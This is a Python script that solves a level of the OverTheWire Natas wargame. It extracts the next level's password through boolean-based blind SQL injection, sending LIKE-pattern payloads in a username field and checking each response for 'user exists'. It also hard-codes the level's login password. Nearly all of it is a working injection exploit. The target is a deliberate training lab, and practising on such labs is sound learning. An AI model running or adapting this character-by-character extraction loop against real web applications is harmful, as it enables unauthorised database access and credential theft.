import requests
import os ,sys
from string import *

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

characters = ascii_lowercase + ascii_uppercase + digits
username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

url = "http://%s.natas.labs.overthewire.org"%username

session = requests.Session()
seen_password = list()

while (len(seen_password) < 32):
	for ch in characters:
		print("Trying char with passwd", "".join(seen_password) + ch )
		response = session.post( url , data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch +'%" # ' } , auth=(username,password))
		content = response.text
		if ('user exists' in content):
			seen_password.append(ch)
		

flag = "".join(seen_password)
print("[+] Gotcha ",flag)